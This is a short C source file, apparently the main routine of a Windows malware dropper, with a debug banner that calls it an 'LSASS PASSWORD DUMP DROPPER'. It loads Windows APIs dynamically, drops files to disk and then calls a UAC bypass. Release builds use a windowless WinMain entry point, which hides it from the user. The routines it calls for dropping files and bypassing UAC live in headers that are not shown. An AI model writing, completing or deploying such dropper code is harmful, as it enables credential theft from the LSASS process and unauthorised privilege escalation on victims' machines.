#include <windows.h>
#include <stdio.h>

#include "LoadAPI.h"

#include "UACBypass.h"
#include "DropFile.h"
#include "DebugFunc.h"




#if _DEBUG
int main() {
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
#endif
	API_Call APICall;

	PrintDebug("[-] Loading function API !\n");
	if (!loadApi(&APICall))
		return FALSE;

	PrintDebug("[-] LSASS PASSWORD DUMP DROPPER\n");
	
	if(DropFiles(APICall.Kernel32Api))
		UACBypass(APICall);


#if _DEBUG
	system("pause");
#endif
	return FALSE;
}